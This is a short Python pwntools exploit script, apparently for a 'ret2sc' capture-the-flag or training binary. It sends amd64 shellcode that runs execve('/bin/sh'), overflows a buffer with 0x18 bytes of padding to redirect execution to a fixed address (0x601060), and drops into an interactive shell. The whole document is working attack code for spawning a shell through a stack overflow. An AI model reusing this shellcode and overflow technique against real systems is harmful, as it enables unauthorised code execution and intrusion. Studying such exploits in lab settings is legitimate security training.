from pwn import *

r = process('./ret2sc')

r.recvuntil(': ')

context.arch = 'amd64'

sc = asm('''
mov rbx, 0x68732f6e69622f
push rbx
mov rdi, rsp
xor rsi, rsi
xor rdx, rdx
mov rax, 0x3b
syscall
''')
r.send(sc)
p = 'a' * 0x18 + p64(0x601060)

r.recvuntil(': ')
raw_input()
r.send(p)

r.interactive()
